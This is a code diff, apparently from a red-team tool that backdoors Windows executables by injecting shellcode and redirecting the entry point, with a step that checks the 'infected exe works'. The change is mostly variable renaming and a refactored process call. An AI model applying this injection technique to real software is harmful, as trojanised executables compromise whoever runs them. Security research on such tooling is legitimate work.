@@ -26,7 +26,7 @@ def inject_exe(
     carrier_invoke_style: CarrierInvokeStyle = settings.carrier_invoke_style
     source_style: FunctionInvokeStyle = settings.source_style
 
-    logger.info("--[ Injecting: {} + {} -> {}".format(
+    logger.info("--[ Injecting: {} into {} -> {}".format(
         shellcode_in, exe_in, exe_out
     ))
 
@@ -42,13 +42,13 @@ def inject_exe(
 
     # superpe is a representation of the exe file. We gonna modify it, and save it at the end.
     superpe = SuperPe(exe_in)
-    peinj = PeBackdoor(superpe, main_shc, carrier_invoke_style)
+    pe_backdoorer = PeBackdoor(superpe, main_shc, carrier_invoke_style)
 
-    if not peinj.injectShellcode():
+    if not pe_backdoorer.injectShellcode():
         logger.error('Could not inject shellcode into PE file!')
         return False
 
-    if not peinj.setupShellcodeEntryPoint():
+    if not pe_backdoorer.setupShellcodeEntryPoint():
         logger.error('Could not setup shellcode launch within PE file!')
         return False
     
@@ -65,8 +65,8 @@ def inject_exe(
     shellcode = file_readall_binary(shellcode_in)
     shellcode_len = len(shellcode)
     code = extract_code_from_exe_file(exe_out)
-    in_code = code[peinj.shellcodeOffsetRel:peinj.shellcodeOffsetRel+shellcode_len]
-    jmp_code = code[peinj.backdoorOffsetRel:peinj.backdoorOffsetRel+12]
+    in_code = code[pe_backdoorer.shellcodeOffsetRel:pe_backdoorer.shellcodeOffsetRel+shellcode_len]
+    jmp_code = code[pe_backdoorer.backdoorOffsetRel:pe_backdoorer.backdoorOffsetRel+12]
     if config.debug:
         observer.add_code_file("exe_extracted_loader", in_code)
         observer.add_code_file("exe_extracted_jmp", jmp_code)
@@ -166,9 +166,7 @@ def verify_injected_exe(exefile: FilePath) -> int:
     # remove indicator file
     pathlib.Path(VerifyFilename).unlink(missing_ok=True)
 
-    run_process_checkret([
-        exefile,
-    ], check=False)
+    run_exe(exefile, check=False)
     time.sleep(SHC_VERIFY_SLEEP)
     if os.path.isfile(VerifyFilename):
         logger.info("---> Verify OK. Infected exe works (file was created)")
